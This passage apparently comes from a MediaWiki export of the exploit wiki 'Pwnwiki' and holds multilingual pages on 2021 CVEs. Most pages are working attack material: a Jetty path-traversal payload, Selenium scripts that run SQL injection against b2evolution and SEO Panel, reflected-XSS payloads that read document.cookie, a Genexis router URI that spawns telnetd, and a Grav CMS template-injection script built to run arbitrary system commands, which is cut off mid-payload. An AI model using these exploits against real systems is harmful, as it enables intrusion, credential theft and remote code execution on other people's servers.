      <comment>Created page with "CVE-2021-28169 Уязвимость служебных сервлетов Jetty ConcatServlet, связанная с раскрытием информации"</comment>
      <origin>4369</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="152" sha1="sxos3o025p0m1a4idwktpsgr0lfhui1" xml:space="preserve">&lt;languages /&gt;

==Затронутая версия==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>sxos3o025p0m1a4idwktpsgr0lfhui1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/uk</title>
    <ns>0</ns>
    <id>3865</id>
    <revision>
      <id>4476</id>
      <timestamp>2021-06-09T11:10:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28169 Jetty Utility Servlets ConcatServlet Уразливість щодо розкриття інформації"</comment>
      <origin>4476</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="156" sha1="kzuzssnbnzxn3ppjrea0hdx7z06vmv0" xml:space="preserve">&lt;languages /&gt;

== Постраждала версія ==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>kzuzssnbnzxn3ppjrea0hdx7z06vmv0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28169 Jetty Utility Servlets ConcatServlet 信息泄漏漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3752</id>
    <revision>
      <id>4363</id>
      <timestamp>2021-06-09T09:43:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  ==影響版本== &lt;pre&gt; &lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2 &lt;/pre&gt;  ==Payload== &lt;pre&gt; /concat?/%2557EB-INF/web.xml &lt;/pre&gt;"</comment>
      <origin>4363</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="131" sha1="oy80bx1slan1woaesfa8nboh2ii7tv1" xml:space="preserve">&lt;languages /&gt;

==影響版本==
&lt;pre&gt;
&lt;= 9.4.40, &lt;= 10.0.2, &lt;= 11.0.2
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/concat?/%2557EB-INF/web.xml
&lt;/pre&gt;</text>
      <sha1>oy80bx1slan1woaesfa8nboh2ii7tv1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28242 b2evolution 7-2-2 - 'cf name' SQL注入漏洞</title>
    <ns>0</ns>
    <id>2256</id>
    <revision>
      <id>2686</id>
      <timestamp>2021-05-06T11:55:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: b2evolution 7-2-2 - 'cf_name' SQL Injection  # Author: @nu11secur1ty # Testing and Debugging: @nu11secur1ty # Date: 05.06.2021 # Vendor: https:/..."</comment>
      <origin>2686</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2747" sha1="07orfenfgcgdn5z5enjk3hq76deqzli" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: b2evolution 7-2-2 - 'cf_name' SQL Injection 
# Author: @nu11secur1ty
# Testing and Debugging: @nu11secur1ty
# Date: 05.06.2021
# Vendor: https://b2evolution.net/
# Link: https://b2evolution.net/downloads/7-2-2
# CVE: CVE-2021-28242
# Proof: https://streamable.com/x51kso

[+] Exploit Source:

#!/usr/bin/python3
# Author: @nu11secur1ty
# CVE-2021-28242


from selenium import webdriver
import time


# Vendor: https://typo3.org/
website_link="
http://192.168.1.3/b2evolution/index.php?disp=login&amp;redirect_to=%2Fb2evolution%2Findex.php%3Fblog%3D2&amp;return_to=%2Fb2evolution%2Findex.php%3Fblog%3D2&amp;source=menu%20link"

# enter your login username
username="admin"

# enter your login password
password="FvsDq7fmHvWF"

#enter the element for username input field
element_for_username="x"

#enter the element for password input field
element_for_password="q"

#enter the element for submit button
element_for_submit="login_action[login]"


browser = webdriver.Chrome() #uncomment this line,for chrome users
#browser = webdriver.Safari() #for macOS users[for others use chrome vis
chromedriver]
#browser = webdriver.Firefox() #uncomment this line,for chrome users

browser.get((website_link))

try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

# Exploit vulnerability MySQL obtain sensitive database information by
injecting SQL commands into the "cf_name" parameter
time.sleep(7)
# Receaving sensitive info for evo_users
browser.get(("http://192.168.1.3/b2evolution/evoadm.php?colselect_submit=&amp;cf_name=SELECT+*+FROM+%60evo_users%60+ORDER+BY+%60evo_&amp;cf_owner=&amp;cf_type=&amp;blog_filter_preset=custom&amp;ctrl=collections"))

time.sleep(7)
# Receaving sensitive info for evo_blogs
browser.get(("
http://192.168.1.3/b2evolution/evoadm.php?colselect_submit=&amp;cf_name=SELECT%20*%20FROM%20`evo_blogs`%20ORDER%20BY%20`evo_blogs`.`blog_name`&amp;cf_owner=&amp;cf_type=&amp;blog_filter_preset=custom&amp;ctrl=collections"))

time.sleep(7)
# Receaving sensitive info for evo_section
browser.get(("http://192.168.1.3/b2evolution/evoadm.php?colselect_submit=&amp;cf_name=SELECT%20*%20FROM%20`evo_section`%20ORDER%20BY%20`evo_section`.`sec_name`&amp;cf_owner=&amp;cf_type=&amp;blog_filter_preset=custom&amp;ctrl=collections"))


time.sleep(7)
browser.close()


print("At the time, of the exploit, you had to see information about the
tables...\n")



except Exception:
#### This exception occurs if the element are not found in the webpage.
print("Sorry, your exploit is not working for some reasons...")
            
&lt;/pre&gt;</text>
      <sha1>07orfenfgcgdn5z5enjk3hq76deqzli</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28417 Seo Panel 4.8.0 - 'search name' XSS漏洞</title>
    <ns>0</ns>
    <id>3336</id>
    <revision>
      <id>3894</id>
      <timestamp>2021-06-03T00:56:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Seo Panel 4.8.0 - 'search_name' Reflected XSS # Date: 21-03-2021 # Exploit Author: Piyush Patil # Vendor Homepage: https://www.seopanel.org/ # S..."</comment>
      <origin>3894</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="965" sha1="lmkpwhkrab111qcqxxqbxgah4xrxgtu" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Seo Panel 4.8.0 - 'search_name' Reflected XSS
# Date: 21-03-2021
# Exploit Author: Piyush Patil
# Vendor Homepage: https://www.seopanel.org/
# Software Link:  https://github.com/seopanel/Seo-Panel/releases/tag/4.8.0
# Version: Seo Panel 4.8.0
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-28417


-Description:
 A cross-site scripting (XSS) issue in the SEO admin login panel version 4.8.0 allows remote attackers to inject JavaScript via the "redirect" parameter.

-Payload used:
x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22

-Steps to reproduce:
1- Login to SEO admin panel
2- Add below line at the end:
http://localhost/archive.php?from_time=2021-03-08&amp;order_col=name&amp;order_val=DESC&amp;report_type=website-search-reports&amp;search_name=x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22&amp;sec=viewWebsiteSearchSummary&amp;to_time=2021-03-09&amp;website_id=http%3a%2f%2fwww.example.com
3- Hover your mouse near to "CTR" field
&lt;/pre&gt;</text>
      <sha1>lmkpwhkrab111qcqxxqbxgah4xrxgtu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28418 Seo Panel 4.8.0 - 'category' XSS漏洞</title>
    <ns>0</ns>
    <id>3335</id>
    <revision>
      <id>3893</id>
      <timestamp>2021-06-03T00:55:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Seo Panel 4.8.0 - 'category' Reflected XSS # Date: 22-03-2021 # Exploit Author: Piyush Patil # Vendor Homepage: https://www.seopanel.org/ # Soft..."</comment>
      <origin>3893</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="763" sha1="7zm4it2ayi1nxdul9h0p9vg0o315tiu" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Seo Panel 4.8.0 - 'category' Reflected XSS
# Date: 22-03-2021
# Exploit Author: Piyush Patil
# Vendor Homepage: https://www.seopanel.org/
# Software Link:  https://github.com/seopanel/Seo-Panel/releases/tag/4.8.0
# Version: Seo Panel 4.8.0
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-28418


-Description:
A cross-site scripting (XSS) issue in the SEO admin login panel version 4.8.0 allows remote attackers to inject JavaScript via the "redirect" parameter.

-Payload used:
x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22

-Steps to reproduce:
1- Login to SEO admin panel
2- Visit:
http://localhost/settings.php?category=x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22
3- Hover your mouse to "Cancel" field
&lt;/pre&gt;</text>
      <sha1>7zm4it2ayi1nxdul9h0p9vg0o315tiu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28419 SEO Panel 4.8.0 - 'order col' SQL盲注漏洞</title>
    <ns>0</ns>
    <id>1515</id>
    <revision>
      <id>1897</id>
      <timestamp>2021-04-26T09:52:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: SEO Panel 4.8.0 - 'order_col' Blind SQL Injection (2) # Author: nu11secur1ty # Testing and Debugging: nu11secur1ty # Date: 04/25/2021 # Vendor:..."</comment>
      <origin>1897</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1676" sha1="9q3u7gncnm6uktonk92v78e3qhl0d3i" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: SEO Panel 4.8.0 - 'order_col' Blind SQL Injection (2)
# Author: nu11secur1ty
# Testing and Debugging: nu11secur1ty
# Date: 04/25/2021
# Vendor: https://www.seopanel.org/
# Link: https://www.seopanel.org/spdownload/4.8.0
# CVE: CVE-2021-28419

[+] Exploit Source:

#!/usr/bin/python3
# Author: @nu11secur1ty
# CVE-2021-28419

from selenium import webdriver
import time


#enter the link to the website you want to automate login.
website_link="http://192.168.1.3/seopanel/login.php"

#enter your login username
username="spadmin"

#enter your login password
password="spadmin"

#enter the element for username input field
element_for_username="userName"

#enter the element for password input field
element_for_password="password"

#enter the element for submit button
element_for_submit="login"


browser = webdriver.Chrome()
browser.get((website_link))

try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

# Exploit
browser.get(("
http://192.168.1.3/seopanel/archive.php?from_time=2021-04-25&amp;order_col=(SELECT
7397 FROM
(SELECT(SLEEP(15)))nu11secur1ty)&amp;order_val=DESC&amp;report_type=website-search-reports&amp;search_name=&amp;sec=viewWebsiteSearchSummary&amp;to_time=2021-04-25&amp;website_id=1"))

print("payload is deployed MySQL is not responding correctly...\n")

except Exception:
#### This exception occurs if the element are not found in the webpage.
print("Some error occured :(")
            
&lt;/pre&gt;</text>
      <sha1>9q3u7gncnm6uktonk92v78e3qhl0d3i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28420 Seo Panel 4.8.0 - 'from time' XSS漏洞</title>
    <ns>0</ns>
    <id>3355</id>
    <revision>
      <id>3919</id>
      <timestamp>2021-06-03T11:56:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Seo Panel 4.8.0 - 'from_time' Reflected XSS # Date: 23-03-2021 # Exploit Author: Piyush Patil # Vendor Homepage: https://www.seopanel.org/ # Ver..."</comment>
      <origin>3919</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="730" sha1="1dicsnjegfobvo6z7klpo9gp9c0wpgr" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Seo Panel 4.8.0 - 'from_time' Reflected XSS
# Date: 23-03-2021
# Exploit Author: Piyush Patil
# Vendor Homepage: https://www.seopanel.org/
# Version: Seo Panel 4.8.0
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-28420

-Description:
A cross-site scripting (XSS) issue in Seo Panel 4.8.0 allows remote
attackers to inject JavaScript via alerts.php and the "from_time" parameter.

-Payload used:
x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22

-Steps to reproduce:
1- Login to SEO admin panel
2- Visit: http://localhost/alerts.php?alert_category=general&amp;from_time=x%22%20onmouseover%3dalert(document.cookie)%20x%3d%22&amp;keyword=&amp;to_time=2021-03-11
3- Hover your mouse to "Period" field
&lt;/pre&gt;</text>
      <sha1>1dicsnjegfobvo6z7klpo9gp9c0wpgr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3302</id>
    <revision>
      <id>3859</id>
      <timestamp>2021-06-01T06:25:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==簡介== &lt;/translate&gt; https://nvd.nist.gov/vuln/detail/CVE-2021-28476  https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476..."</comment>
      <origin>3859</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="226" sha1="0k0bbr7vhdqk03xzd0z67k9n9gyjmj3" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介==
&lt;/translate&gt;
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>0k0bbr7vhdqk03xzd0z67k9n9gyjmj3</sha1>
    </revision>
    <revision>
      <id>3860</id>
      <parentid>3859</parentid>
      <timestamp>2021-06-01T06:25:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>3860</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="237" sha1="54gc98risam8gzy34wu7utpyeiohciu" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
&lt;/translate&gt;
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>54gc98risam8gzy34wu7utpyeiohciu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>3307</id>
    <revision>
      <id>3865</id>
      <timestamp>2021-06-01T06:26:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Introduction=="</comment>
      <origin>3865</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="207" sha1="0ojvpb373rjqnhtsyp4qrlplqh8ie5f" xml:space="preserve">&lt;languages  /&gt;
==Introduction==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>0ojvpb373rjqnhtsyp4qrlplqh8ie5f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>3320</id>
    <revision>
      <id>3878</id>
      <timestamp>2021-06-01T06:30:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28476 Vulnerabilidad de ejecución remota de código de Microsoft Hyper-V"</comment>
      <origin>3878</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="210" sha1="06mq17vnv6kzm7qatw0cl5gtriu5y3b" xml:space="preserve">&lt;languages  /&gt;
== Introducción ==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>06mq17vnv6kzm7qatw0cl5gtriu5y3b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>3322</id>
    <revision>
      <id>3880</id>
      <timestamp>2021-06-01T06:31:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28476 פגיעות ביצוע קוד מרחוק של Microsoft Hyper-V"</comment>
      <origin>3880</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="205" sha1="tam4x5wl4ukz1v1sceks94gw9j0yf6z" xml:space="preserve">&lt;languages  /&gt;
== מבוא ==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>tam4x5wl4ukz1v1sceks94gw9j0yf6z</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>3321</id>
    <revision>
      <id>3879</id>
      <timestamp>2021-06-01T06:30:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28476 Уязвимость удаленного выполнения кода Microsoft Hyper-V"</comment>
      <origin>3879</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="213" sha1="77f1knl3ekdmv22hjlbgui4b74a00de" xml:space="preserve">&lt;languages  /&gt;
== Введение ==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>77f1knl3ekdmv22hjlbgui4b74a00de</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/uk</title>
    <ns>0</ns>
    <id>3319</id>
    <revision>
      <id>3877</id>
      <timestamp>2021-06-01T06:29:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28476 Уразливість віддаленого виконання коду Microsoft Hyper-V"</comment>
      <origin>3877</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="207" sha1="shnn2obz9iudd5iv7enwgr5p8ul9o5j" xml:space="preserve">&lt;languages  /&gt;
== Вступ ==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>shnn2obz9iudd5iv7enwgr5p8ul9o5j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3316</id>
    <revision>
      <id>3874</id>
      <timestamp>2021-06-01T06:28:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==简介=="</comment>
      <origin>3874</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="201" sha1="gknix2qwlmi2mqmewucq6dwmyvjrzal" xml:space="preserve">&lt;languages  /&gt;
==简介==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>gknix2qwlmi2mqmewucq6dwmyvjrzal</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5116</id>
    <revision>
      <id>5856</id>
      <timestamp>2021-06-24T03:58:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-28476 Microsoft Hyper-V 遠程代碼執行漏洞"</comment>
      <origin>5856</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="201" sha1="kgdkaski0txfyx7j6y5z58nojrdti8k" xml:space="preserve">&lt;languages  /&gt;
==簡介==
https://nvd.nist.gov/vuln/detail/CVE-2021-28476

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28476

==POC==
https://github.com/0vercl0k/CVE-2021-28476</text>
      <sha1>kgdkaski0txfyx7j6y5z58nojrdti8k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28935 CMS Made Simple 2.2.15 XSS漏洞</title>
    <ns>0</ns>
    <id>1486</id>
    <revision>
      <id>1864</id>
      <timestamp>2021-04-22T09:25:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS) # Date: 2021/03/19 # Exploit Author: bt0 # Vendor Homepage: http://www.cmsmadesimple..."</comment>
      <origin>1864</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="838" sha1="tkbaoknhqfz8bsdkqrcdkq0mm5hdeo9" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)
# Date: 2021/03/19
# Exploit Author: bt0
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: https://s3.amazonaws.com/cmsms/downloads/14832/cmsms-2.2.15-install.zip
# Version: 2.2.15
# CVE: CVE-2021-28935 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28935

-----------------------------------------------------------

If you log into Admin panel and open My Preferences you could be able to exploit XSS in title field

Reflected XSS in /admin/addbookmark.php

Some payloads that works:

"&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;"
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;"
63311';alert(1)//812
//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;

------------------------------------------------------------
            
&lt;/pre&gt;</text>
      <sha1>tkbaoknhqfz8bsdkqrcdkq0mm5hdeo9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29003 Genexis PLATINUM 4410 2.1 P4410-V2-1.28 RCE漏洞</title>
    <ns>0</ns>
    <id>1320</id>
    <revision>
      <id>1659</id>
      <timestamp>2021-04-14T08:54:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== # Exploit Title: Genexis PLATINUM 4410 2.1 P4410-V2-1.28 - RCE # Date: 12-4-2021 # Exploit Author: Jay Sharma  # Version: Genexis PLATINUM 4410 2.1 P4410-V2-1.28 #..."</comment>
      <origin>1659</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="476" sha1="0s84i7mjoms9cxt7n7sfn6zxv1fppfo" xml:space="preserve">==Payload==
# Exploit Title: Genexis PLATINUM 4410 2.1 P4410-V2-1.28 - RCE
# Date: 12-4-2021
# Exploit Author: Jay Sharma 
# Version: Genexis PLATINUM 4410 2.1 P4410-V2-1.28
# Tested on: V2.1
# CVE : CVE-2021-29003

#steps to reproduce#

Genexis PLATINUM 4410 2.1 P4410-V2-1.28 devices allow remote attackers to execute arbitrary code via shell metacharacters to sys_config_valid.xgi, as demonstrated by the http://x.x.x.x/sys_config_valid.xgi?exeshell=%60telnetd%20%26%60 URI</text>
      <sha1>0s84i7mjoms9cxt7n7sfn6zxv1fppfo</sha1>
    </revision>
    <revision>
      <id>1660</id>
      <parentid>1659</parentid>
      <timestamp>2021-04-14T08:55:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>1660</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="489" sha1="3opzv32javoar1p0qj08163zljmpuym" xml:space="preserve">==Payload==
&lt;pre&gt;
# Exploit Title: Genexis PLATINUM 4410 2.1 P4410-V2-1.28 - RCE
# Date: 12-4-2021
# Exploit Author: Jay Sharma 
# Version: Genexis PLATINUM 4410 2.1 P4410-V2-1.28
# Tested on: V2.1
# CVE : CVE-2021-29003

#steps to reproduce#

Genexis PLATINUM 4410 2.1 P4410-V2-1.28 devices allow remote attackers to execute arbitrary code via shell metacharacters to sys_config_valid.xgi, as demonstrated by the http://x.x.x.x/sys_config_valid.xgi?exeshell=%60telnetd%20%26%60 URI
&lt;/pre&gt;</text>
      <sha1>3opzv32javoar1p0qj08163zljmpuym</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29440 Grav CMS 1.7.10 服務器端模板注入漏洞</title>
    <ns>0</ns>
    <id>3645</id>
    <revision>
      <id>4230</id>
      <timestamp>2021-06-07T12:10:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Title: Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated) # Author: enox # Date: 06-06-2021 # Vendor: https://getgrav.org/ # Software Link..."</comment>
      <origin>4230</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4075" sha1="5pwjsjnfiwdvhok2g2lpj60vlzo3dlo" xml:space="preserve">==EXP==
&lt;pre&gt;
# Title: Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated)
# Author: enox
# Date: 06-06-2021
# Vendor: https://getgrav.org/
# Software Link: https://getgrav.org/download/core/grav-admin/1.7.10
# Vulnerable Version(s): Grav CMS 1.7.10
# CVE: CVE-2021-29440
# Credits: https://blog.sonarsource.com/grav-cms-code-execution-vulnerabilities
# NOTES: You need a user who has access to /admin dashboard with page creation privileges.

#!/usr/bin/python

import requests
from bs4 import BeautifulSoup
import random
import string


username = 'username'
password = 'password'
url = 'http://grav.local'


session = requests.Session()

# Autheticating
## Getting login-nonce
def login(url,username,password):
	r = session.get(url + "/admin")
	soup = BeautifulSoup(r.text, features="lxml")
	nonce = str(soup.findAll('input')[2])
	nonce = nonce[47:79]

	## Logging in
	payload =f'data%5Busername%5D={username}&amp;data%5Bpassword%5D={password}&amp;task=login&amp;login-nonce={nonce}'
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	r = session.post(url+"/admin",data=payload,headers=headers)


# Creating Page for RCE

def rce(url,cmd):
	## Getting form nonce and unique form id
	project_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))
	r = session.get(url+f"/admin/pages/{project_name}/:add")
	soup = BeautifulSoup(r.text, features="lxml")
	nonce = str(soup.findAll('input')[72])
	form_id = str(soup.findAll('input')[71])
	form_id = form_id[54:86]
	nonce = nonce[46:78]

	## Creating Page
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	payload = f'task=save&amp;data%5Bheader%5D%5Btitle%5D={project_name}&amp;data%5Bcontent%5D=%7B%7B+system%28%27{cmd}%27%29+%7D%7D&amp;data%5Bfolder%5D={project_name}&amp;data%5Broute%5D=&amp;data%5Bname%5D=default&amp;data%5Bheader%5D%5Bbody_classes%5D=&amp;data%5Bordering%5D=1&amp;data%5Border%5D=&amp;toggleable_data%5Bheader%5D%5Bprocess%5D=on&amp;data%5Bheader%5D%5Bprocess%5D%5Btwig%5D=1&amp;data%5Bheader%5D%5Border_by%5D=&amp;data%5Bheader%5D%5Border_manual%5D=&amp;data%5Bblueprint%5D=&amp;data%5Blang%5D=&amp;_post_entries_save=edit&amp;__form-name__=flex-pages&amp;__unique_form_id__={form_id}&amp;form-nonce={nonce}&amp;toggleable_data%5Bheader%5D%5Bpublished%5D=0&amp;toggleable_data%5Bheader%5D%5Bdate%5D=0&amp;toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bmetadata%5D=0&amp;toggleable_data%5Bheader%5D%5Bdateformat%5D=0&amp;toggleable_data%5Bheader%5D%5Bmenu%5D=0&amp;toggleable_data%5Bheader%5D%5Bslug%5D=0&amp;toggleable_data%5Bheader%5D%5Bredirect%5D=0&amp;data%5Bheader%5D%5Bprocess%5D%5Bmarkdown%5D=0&amp;toggleable_data%5Bheader%5D%5Btwig_first%5D=0&amp;toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&amp;toggleable_data%5Bheader%5D%5Bchild_type%5D=0&amp;toggleable_data%5Bheader%5D%5Broutable%5D=0&amp;toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&amp;toggleable_data%5Bheader%5D